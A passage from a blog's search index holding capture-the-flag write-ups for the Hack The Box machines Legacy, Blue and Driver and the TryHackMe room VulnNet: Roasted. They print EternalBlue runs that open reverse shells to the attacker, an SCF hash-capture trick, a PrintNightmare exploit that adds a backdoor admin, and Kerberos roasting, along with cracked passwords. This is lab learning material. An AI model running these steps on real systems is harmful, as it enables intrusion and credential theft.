Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED| Anonymous access: &amp;lt;none&amp;gt;| \\\\10.10.10.4\\IPC$: | warning: Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED|_ Anonymous access: READExploitation &amp;amp;&amp;amp; Foothold &amp;amp;&amp;amp; PwnSo we only have one exposed service: SMB and we know the OS version is Windows XP. Let’s try to use Eternal Blue exploit :$ msfconsolemsf6 &amp;gt; use exploit/windows/smb/ms17_010_psexec[*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms17_010_psexec) &amp;gt; set rhosts 10.10.10.4rhosts =&amp;gt; 10.10.10.4msf6 exploit(windows/smb/ms17_010_psexec) &amp;gt; set lhost tun0lhost =&amp;gt; tun0msf6 exploit(windows/smb/ms17_010_psexec) &amp;gt; run[*] Started reverse TCP handler on 10.10.14.5:4444 [*] 10.10.10.4:445 - Target OS: Windows 5.1[*] 10.10.10.4:445 - Filling barrel with fish... done[*] 10.10.10.4:445 - &amp;lt;---------------- | Entering Danger Zone | ----------------&amp;gt;[*] 10.10.10.4:445 - [*] Preparing dynamite...[*] 10.10.10.4:445 - [*] Trying stick 1 (x86)...Boom![*] 10.10.10.4:445 - [+] Successfully Leaked Transaction![*] 10.10.10.4:445 - [+] Successfully caught Fish-in-a-barrel[*] 10.10.10.4:445 - &amp;lt;---------------- | Leaving Danger Zone | ----------------&amp;gt;[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x820c07c0[*] 10.10.10.4:445 - Built a write-what-where primitive...[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained![*] 10.10.10.4:445 - Selecting native target[*] 10.10.10.4:445 - Uploading payload... RHVehnfb.exe[*] 10.10.10.4:445 - Created \\RHVehnfb.exe...[+] 10.10.10.4:445 - Service started successfully...[*] Sending stage (175174 bytes) to 10.10.10.4[*] 10.10.10.4:445 - Deleting \\RHVehnfb.exe...[*] Meterpreter session 1 opened (10.10.14.5:4444 -&amp;gt; 10.10.10.4:1035 ) at 2022-01-18 04:22:50 +0000And voila, we have a system shell on the target. Let’s get those flags :meterpreter &amp;gt; shellProcess 1424 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\WINDOWS\\system32&amp;gt;more &quot;c:\\documents and settings\\john\\desktop\\user.txt&quot;more &quot;c:\\documents and settings\\john\\desktop\\user.txt&quot;(redacted)C:\\WINDOWS\\system32&amp;gt;more &quot;c:\\documents and settings\\administrator\\desktop\\root.txt&quot;more &quot;c:\\documents and settings\\administrator\\desktop\\root.txt&quot;(redacted)Thanks for reading &amp;lt;3h3x" }, { "title": "Hack The Box - Blue", "url": "/posts/htb-blue/", "categories": "hackthebox", "tags": "cve, windows, smb, eternalblue", "date": "2022-01-17 00:00:00 -0500", "snippet": "Challenge descriptionhttps://app.hackthebox.com/machines/BlueThis VM is an easy Windows machineReconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1-65535 --ulimit 5000 -- -A -sC -Pn[...]PORT STATE SERVICE REASON VERSION135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)49152/tcp open msrpc syn-ack Microsoft Windows RPC49153/tcp open msrpc syn-ack Microsoft Windows RPC49154/tcp open msrpc syn-ack Microsoft Windows RPC49155/tcp open msrpc syn-ack Microsoft Windows RPC49156/tcp open msrpc syn-ack Microsoft Windows RPC49157/tcp open msrpc syn-ack Microsoft Windows RPCService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-01-18T04:55:38|_ start_date: 2022-01-18T04:53:25| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.1: |_ Message signing enabled but not required| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 29825/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 12383/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 19006/udp): CLEAN (Timeout)| Check 4 (port 33181/udp): CLEAN (Failed to receive data)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1:professional| Computer name: haris-PC| NetBIOS computer name: HARIS-PC\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2022-01-18T04:55:39+00:00|_clock-skew: mean: 15m05s, deviation: 1s, median: 15m04sSMB Enumeration$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip -PnHost script results:| smb-enum-shares: | account_used: guest| \\\\10.10.10.40\\ADMIN$: | Type: STYPE_DISKTREE_HIDDEN| Comment: Remote Admin| Anonymous access: &amp;lt;none&amp;gt;| Current user access: &amp;lt;none&amp;gt;| \\\\10.10.10.40\\C$: | Type: STYPE_DISKTREE_HIDDEN| Comment: Default share| Anonymous access: &amp;lt;none&amp;gt;| Current user access: &amp;lt;none&amp;gt;| \\\\10.10.10.40\\IPC$: | Type: STYPE_IPC_HIDDEN| Comment: Remote IPC| Anonymous access: READ| Current user access: READ/WRITE| \\\\10.10.10.40\\Share: | Type: STYPE_DISKTREE| Comment: | Anonymous access: &amp;lt;none&amp;gt;| Current user access: READ| \\\\10.10.10.40\\Users: | Type: STYPE_DISKTREE| Comment: | Anonymous access: &amp;lt;none&amp;gt;|_ Current user access: READWe have read acces to two shares: “Share” and “Users” but their content is not interesting.Exploitation &amp;amp;&amp;amp; Foothold &amp;amp;&amp;amp; PwnRecap: The machine is a Windows 7 with SMB service exposed.Let’s try to exploit SMB with Eternal Blue :$ msfconsolemsf6 &amp;gt; use exploit/windows/smb/ms17_010_eternalblue[*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set rhosts 10.10.10.40rhosts =&amp;gt; 10.10.10.40msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set lhost tun0lhost =&amp;gt; tun0msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; run[*] Started reverse TCP handler on 10.10.14.5:4444 [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)[*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete)[+] 10.10.10.40:445 - The target is vulnerable.[*] 10.10.10.40:445 - Connecting to target for exploitation.[+] 10.10.10.40:445 - Connection established for exploitation.[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)[*] 10.10.10.40:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes[*] 10.10.10.40:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv[*] 10.10.10.40:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet[*] 10.10.10.40:445 - Starting non-paged pool grooming[+] 10.10.10.40:445 - Sending SMBv2 buffers[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 10.10.10.40:445 - Sending final SMBv2 buffers.[*] 10.10.10.40:445 - Sending last fragment of exploit packet![*] 10.10.10.40:445 - Receiving response from exploit packet[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 10.10.10.40:445 - Sending egg to corrupted connection.[*] 10.10.10.40:445 - Triggering free of corrupted buffer.[*] Sending stage (200262 bytes) to 10.10.10.40[*] Meterpreter session 1 opened (10.10.14.5:4444 -&amp;gt; 10.10.10.40:49158 ) at 2022-01-18 04:52:01 +0000[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=And voila, we have a system shell on the target. Let’s get those flags :meterpreter &amp;gt; shellProcess 2448 created.Channel 1 created.Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&amp;gt;C:\\Windows\\system32&amp;gt;whoamiwhoamint authority\\systemC:\\Windows\\system32&amp;gt;dir c:\\users dir c:\\users Volume in drive C has no label. Volume Serial Number is A0EF-1911 Directory of c:\\users21/07/2017 06:56 &amp;lt;DIR&amp;gt; .21/07/2017 06:56 &amp;lt;DIR&amp;gt; ..21/07/2017 06:56 &amp;lt;DIR&amp;gt; Administrator14/07/2017 13:45 &amp;lt;DIR&amp;gt; haris12/04/2011 07:51 &amp;lt;DIR&amp;gt; Public 0 File(s) 0 bytes 5 Dir(s) 17,449,816,064 bytes freeC:\\Windows\\system32&amp;gt;more c:\\users\\administrator\\desktop\\root.txtmore c:\\users\\administrator\\desktop\\root.txtff548eb71e920ff6c08843ce9df4e717C:\\Windows\\system32&amp;gt;more c:\\users\\haris\\desktop\\user.txtmore c:\\users\\haris\\desktop\\user.txt4c546aea7dbee75cbd71de245c8deea9Thanks for reading &amp;lt;3h3x" }, { "title": "Hack The Box - Driver", "url": "/posts/htb-driver/", "categories": "hackthebox", "tags": "cve, windows, smb, printnightmare", "date": "2022-01-16 00:00:00 -0500", "snippet": "Challenge descriptionhttps://app.hackthebox.com/machines/DriverThis VM is an easy Windows machineReconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1,65535 -- -A -sCPORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin|_http-server-header: Microsoft-IIS/10.0135/tcp open msrpc syn-ack Microsoft Windows RPC445/tcp open microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-01-17T02:16:50|_ start_date: 2022-01-16T20:40:33| smb-security-mode: | authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 25778/tcp): CLEAN (Timeout)| Check 2 (port 18115/tcp): CLEAN (Timeout)| Check 3 (port 26928/udp): CLEAN (Timeout)| Check 4 (port 15033/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58sSMB EnumerationAll tools I used reported no open shareWeb EnumerationBrowsing to http://driver.htb gets us to a basic authentication login prompt. After trying a couple usual default password, I manage to log in with admin/admin.After logging in, we get to what looks like a printer admin page.On the “Firmware Updates” tab, we can upload a file and the page says : Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.It’s a pretty clear indication that “someone” or “something” will check the file we upload.After trying some upload tricks, well, no tricks are needed. There are no restriction what so ever.Exploitation &amp;amp;&amp;amp; FootholdLet’s read this again: Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.It says that our uploaded file will be placed on their file share which implies that someone will browse the share.Let’s do a SCF file attackPer Pentestlab.blog: However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share. When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user. During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed NTLM/LANMAN password is encrypted again with this challenge key. Responder will capture the NTLMv2 hash.$ cat &amp;lt;&amp;lt; EOF &amp;gt; exploit.scf [Shell]Command=2IconFile=\\\\10.10.14.74\\share\\exploit.ico[Taskbar]Command=ToggleDesktopEOFWe can now upload our exploit using the firmware update page and wait for responder to capture hashes:$ sudo responder -w --lm -v -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp;amp; MDNS Responder 3.1.1.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C[...][SMB] NTLMv2 Client : ::ffff:10.10.11.106[SMB] NTLMv2 Username : DRIVER\\tony[SMB] NTLMv2 Hash : tony::DRIVER:90915e30a4d61b55:EFD5982FC730F2132B289A758EF1AB26:010100000000000017D7481F870BD801DADD4A94693D22FF00000000020000000000000000000000[...]Now, let’s crack it and use the password to log on the target:$ hashcat -a 0 -m 5600 hashes /opt/wordlists/rockyou.txt hashcat (v6.2.5) starting[...]TONY::DRIVER:a4a1daba2e76ad05:597b6b92e2114645d6f9cf39f3a315ff:01010000000000007212b4fe870bd8011aa3e96919e9f60000000000020000000000000000000000:liltony[...]$ evil-winrm -i $ip -u tony -p liltony -s /tmp/driver*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; more c:\\users\\tony\\desktop\\user.txt(redacted)Privilege EscalationTo escalate our privileges to administrator, we’ll be exploiting a recently discovered vulnerability affecting the Windows print spooler.First, download the exploit and open a winrm session using Evil-Winrm using the -s option to load the folder containing the exploit.The exploit script will allow us to create a new admin local user.$ wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1 -O /tmp/driver/CVE-2021-1675.ps12022-01-17 08:55:58 (7.46 MB/s) - ‘CVE-2021-1675.ps1’ saved [178561/178561]$ evil-winrm -i $ip -u tony -p liltony -s /tmp/driver*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt;When Evil-Winrm is opened with the -s (–scripts) option, all the scripts inside the folder becomes directly accessible within the winrm session. Let’s load and run the exploit to create our backdoor user.*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; CVE-2021-1675.ps1*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; invoke-nightmare -newuser h3x -newpass h3xp4ss![+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll[+] using pDriverPath = &quot;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll&quot;[+] added user h3x as local administrator[+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; net localgroup administratorsAlias name administratorsComment Administrators have complete and unrestricted access to the computer/domainMembers-------------------------------------------------------------------------------Administratorh3xThe command completed successfully.*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; exitNow let’s use our new user to get admin privileges.$ evil-winrm -i $ip -u h3x -p h3xp4ss! Evil-WinRM shell v3.3*Evil-WinRM* PS C:\\Users\\h3x\\Documents&amp;gt; more c:\\users\\administrator\\desktop\\root.txt(redacted)Thanks for reading &amp;lt;3h3x" }, { "title": "Try Hack Me - VulnNet: Roasted", "url": "/posts/hack-vulnnet-roasted/", "categories": "tryhackme", "tags": "windows, kerberos, activedirectory", "date": "2022-01-14 00:00:00 -0500", "snippet": "Challenge descriptionhttps://tryhackme.com/room/vulnnetroastedReconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1-65535 -- -A -sC .----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------🌍HACK THE PLANET🌍[...]PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack Simple DNS Plus88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2022-01-15 03:43:28Z)135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack464/tcp open kpasswd5? syn-ack593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped syn-ack3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf syn-ack .NET Message Framing49665/tcp open unknown syn-ack49667/tcp open unknown syn-ack49669/tcp open unknown syn-ack49670/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.049676/tcp open unknown syn-ack49689/tcp open unknown syn-ack49705/tcp open unknown syn-ackService Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 10257/tcp): CLEAN (Timeout)| Check 2 (port 45437/tcp): CLEAN (Timeout)| Check 3 (port 14149/udp): CLEAN (Timeout)| Check 4 (port 19319/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required| smb2-time: | date: 2022-01-15T03:44:06|_ start_date: N/A|_clock-skew: 0s```$ nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 $ip -PnStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-15 04:41 UTCNmap scan report for 10.10.229.96Host is up (0.23s latency).PORT STATE SERVICE VERSION389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)| ldap-rootdse: | LDAP Results| &amp;lt;ROOT&amp;gt;| domainFunctionality: 7| forestFunctionality: 7| domainControllerFunctionality: 7| rootDomainNamingContext: DC=vulnnet-rst,DC=local| ldapServiceName: vulnnet-rst.local:win-2bo8m1oe1m1$@VULNNET-RST.LOCAL[...]| dsServiceName: CN=NTDS Settings,CN=WIN-2BO8M1OE1M1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vulnnet-rst,DC=local| dnsHostName: WIN-2BO8M1OE1M1.vulnnet-rst.local| defaultNamingContext: DC=vulnnet-rst,DC=local| currentTime: 20220115044146.0Z|_ configurationNamingContext: CN=Configuration,DC=vulnnet-rst,DC=localService Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windowsOur target is a DC for domain vulnnet-rst.localLet’s move on to services enumerationSMB EnumerationWe start by enumerating Samba shares$ smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H $ip[+] IP: 10.10.229.96:445 Name: 10.10.229.96 Disk Permissions Comment---- ----------- -------ADMIN$ NO ACCESS Remote AdminC$ NO ACCESS Default shareIPC$ READ ONLY Remote IPCNETLOGON NO ACCESS Logon server share SYSVOL NO ACCESS Logon server share VulnNet-Business-Anonymous READ ONLY VulnNet Business SharingVulnNet-Enterprise-Anonymous READ ONLY VulnNet Enterprise Sharing$ smbclient //$ip/VulnNet-Enterprise-AnonymousEnter WORKGROUP\\h3x&#39;s password: Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; mask &quot;&quot;smb: \\&amp;gt; recurse ONsmb: \\&amp;gt; prompt OFFsmb: \\&amp;gt; mget *getting file \\Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)getting file \\Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0.4 KiloBytes/sec) (average 0.5 KiloBytes/sec)getting file \\Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)$ smbclient //$ip/VulnNet-Business-AnonymousEnter WORKGROUP\\h3x&#39;s password: Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; mask &quot;&quot;smb: \\&amp;gt; recurse ONsmb: \\&amp;gt; prompt OFFsmb: \\&amp;gt; mget *getting file \\Business-Manager.txt of size 758 as Business-Manager.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)getting file \\Business-Sections.txt of size 654 as Business-Sections.txt (0.5 KiloBytes/sec) (average 0.3 KiloBytes/sec)getting file \\Business-Tracking.txt of size 471 as Business-Tracking.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)$ cat *.txt [...]Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. [...]Jack Goldenhand is the person you should reach to for any business unrelated proposals.[...]Tony Skid is a core security manager and takes care of internal infrastructure.[...]Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.[...]Active Directory EnumerationText files we got from the open shares gives us the name of some employees. Let’s try to make ourselves a custom user lists and test them out:$ cat &amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; customusers.txtalexawhitehatjackgoldenhandtonyskidjohnnyleetalexaawhitehatalexa.whitehatjackjgoldenhandjack.goldenhandtonytskidtony.skidjohnnyjleetjohnny.leetwhitehatgoldenhandskidleetEOF$ kerbrute userenum --dc $ip -d $dom ./customusers.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 01/15/22 - Ronnie Flathers @ropnop2022/01/15 18:54:22 &amp;gt; Using KDC(s):2022/01/15 18:54:22 &amp;gt; 10.10.247.181:882022/01/15 18:54:23 &amp;gt; Done! Tested 20 usernames (0 valid) in 0.692 secondsNo luck :(Next, we use Impacket’s lookupsid.py to enumerate SIDs on the domain$ lookupsid.py anonymous@$ip -no-passImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Brute forcing SIDs at 10.10.247.181[*] StringBinding ncacn_np:10.10.247.181[\\pipe\\lsarpc][*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213498: VULNNET-RST\\Enterprise Read-only Domain Controllers (SidTypeGroup)500: VULNNET-RST\\Administrator (SidTypeUser)501: VULNNET-RST\\Guest (SidTypeUser)502: VULNNET-RST\\krbtgt (SidTypeUser)512: VULNNET-RST\\Domain Admins (SidTypeGroup)513: VULNNET-RST\\Domain Users (SidTypeGroup)514: VULNNET-RST\\Domain Guests (SidTypeGroup)515: VULNNET-RST\\Domain Computers (SidTypeGroup)516: VULNNET-RST\\Domain Controllers (SidTypeGroup)517: VULNNET-RST\\Cert Publishers (SidTypeAlias)518: VULNNET-RST\\Schema Admins (SidTypeGroup)519: VULNNET-RST\\Enterprise Admins (SidTypeGroup)520: VULNNET-RST\\Group Policy Creator Owners (SidTypeGroup)521: VULNNET-RST\\Read-only Domain Controllers (SidTypeGroup)522: VULNNET-RST\\Cloneable Domain Controllers (SidTypeGroup)525: VULNNET-RST\\Protected Users (SidTypeGroup)526: VULNNET-RST\\Key Admins (SidTypeGroup)527: VULNNET-RST\\Enterprise Key Admins (SidTypeGroup)553: VULNNET-RST\\RAS and IAS Servers (SidTypeAlias)571: VULNNET-RST\\Allowed RODC Password Replication Group (SidTypeAlias)572: VULNNET-RST\\Denied RODC Password Replication Group (SidTypeAlias)1000: VULNNET-RST\\WIN-2BO8M1OE1M1$ (SidTypeUser)1101: VULNNET-RST\\DnsAdmins (SidTypeAlias)1102: VULNNET-RST\\DnsUpdateProxy (SidTypeGroup)1104: VULNNET-RST\\enterprise-core-vn (SidTypeUser)1105: VULNNET-RST\\a-whitehat (SidTypeUser)1109: VULNNET-RST\\t-skid (SidTypeUser)1110: VULNNET-RST\\j-goldenhand (SidTypeUser)1111: VULNNET-RST\\j-leet (SidTypeUser)$ cat &amp;lt;&amp;lt; EOF &amp;gt; customusers.txta-whitehatt-skidj-goldenhandj-leetenterprise-core-vnEOF$ kerbrute userenum --dc $ip -d $dom ./customusers.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 01/15/22 - Ronnie Flathers @ropnop2022/01/15 18:55:29 &amp;gt; Using KDC(s):2022/01/15 18:55:29 &amp;gt; 10.10.247.181:882022/01/15 18:55:29 &amp;gt; [+] VALID USERNAME: a-whitehat@vulnnet-rst.local2022/01/15 18:55:29 &amp;gt; [+] VALID USERNAME: j-goldenhand@vulnnet-rst.local2022/01/15 18:55:29 &amp;gt; [+] VALID USERNAME: enterprise-core-vn@vulnnet-rst.local2022/01/15 18:55:29 &amp;gt; [+] VALID USERNAME: t-skid@vulnnet-rst.local2022/01/15 18:55:29 &amp;gt; [+] VALID USERNAME: j-leet@vulnnet-rst.local2022/01/15 18:55:29 &amp;gt; Done! Tested 25 usernames (5 valid) in 0.771 secondsWith a list of 5 valid usern, and judging by the name of the challenge, we will now try to roast this machine.Exploitation &amp;amp;&amp;amp; FootholdASREPRoastFrom our list of users, we’re gonna try to find an “ASREPRoastable” victim$ GetNPUsers.py -usersfile ./customusers.txt -format hashcat -outputfile hashes.asreproast -dc-ip $ip $dom/ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[-] User a-whitehat doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User j-goldenhand doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User j-leet doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User enterprise-core-vn doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set&amp;amp; cat hashes.asreproast$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:61c29c8ea1dbcec71d69893539932bbda5[...]fd269eab3058We have our ASREPRoastable user, let’s try and crack the hash$ hashcat -m 18200 --force -a 0 hashes.asreproast /opt/wordlists/rockyou.txt$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:61c29c8ea1dbce3[...]15d018b2f3058:tj072889*With that credentials in hand, we should be able to find a Kerberoastable userKerberoastWe start by using t-skid’s credentials to search for a victim$ GetUserSPNs.py -dc-ip $ip -outputfile ./kerberoast.hashes -usersfile ./customusers.txt $dom/t-skid:tj072889* &amp;amp;&amp;amp; cat kerberoast.hashes$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$enterprise-core-vn*$e7984c52a33e14a7c47dd3e8bf723e46$60c20d75bd82b2b0d1b6d516b06ca[...]2d1104fWe can now crack the password$ hashcat -m 13100 --force -a 0 ./kerberoast.hashes /opt/wordlists/rockyou.txt$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$enterprise-core-vn*$a7a1[...]60ca62:ry=ibfkfv,s6h,Privilege EscalationLet’s do an authenticated share enumeration$ smbmap -u enterprise-core-vn -p &#39;ry=ibfkfv,s6h,&#39; -P 445 -H $ip[+] IP: 10.10.95.159:445 Name: vulnnet-rst.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share VulnNet-Business-Anonymous READ ONLY VulnNet Business Sharing VulnNet-Enterprise-Anonymous READ ONLY VulnNet Enterprise SharingWe have read access on netlogon:$ smbclient -U enterprise-core-vn //$ip/NETLOGONEnter WORKGROUP\\enterprise-core-vn&#39;s password: Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; ls . D 0 Tue Mar 16 23:15:49 2021 .. D 0 Tue Mar 16 23:15:49 2021 ResetPassword.vbs A 2821 Tue Mar 16 23:18:14 2021 8771839 blocks of size 4096. 4519613 blocks availablesmb: \\&amp;gt; get ResetPassword.vbsgetting file \\ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)Inside NETLOGON we find a vbs script with a username and password in it. Let’s try it out$ cat ResetPassword.vbs Option ExplicitDim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomainDim strUserDN, objUser, strPassword, strUserNTName[...]strUserNTName = &quot;a-whitehat&quot;strPassword = &quot;bNdKVkjv3RR9ht&quot;[...]$ evil-winrm -i $ip -u a-whitehat -p bNdKVkjv3RR9ht*Evil-WinRM* PS C:\\Users\\a-whitehat\\Documents&amp;gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description 